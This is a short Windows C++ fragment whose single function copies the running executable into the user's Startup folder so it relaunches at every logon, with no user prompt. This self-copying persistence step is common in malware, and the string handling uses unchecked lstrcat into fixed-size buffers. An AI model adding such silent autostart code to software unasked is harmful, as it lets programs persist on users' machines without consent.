#include <Windows.h>
#include <ShlObj.h>
#include <Psapi.h>

void InstallToStartup() {
	TCHAR _EXECUTABLE_PATH[MAX_PATH], _STARTUP_PATH[MAX_PATH], _FILE_NAME[MAX_PATH];

	GetModuleFileName(NULL, _EXECUTABLE_PATH, MAX_PATH);
	SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, _STARTUP_PATH);
	GetModuleBaseName(GetCurrentProcess(), NULL, _FILE_NAME, MAX_PATH);

	lstrcat(_STARTUP_PATH, L"\\");
	lstrcat(_STARTUP_PATH, _FILE_NAME);
	
	CopyFile(_EXECUTABLE_PATH, _STARTUP_PATH, FALSE);
}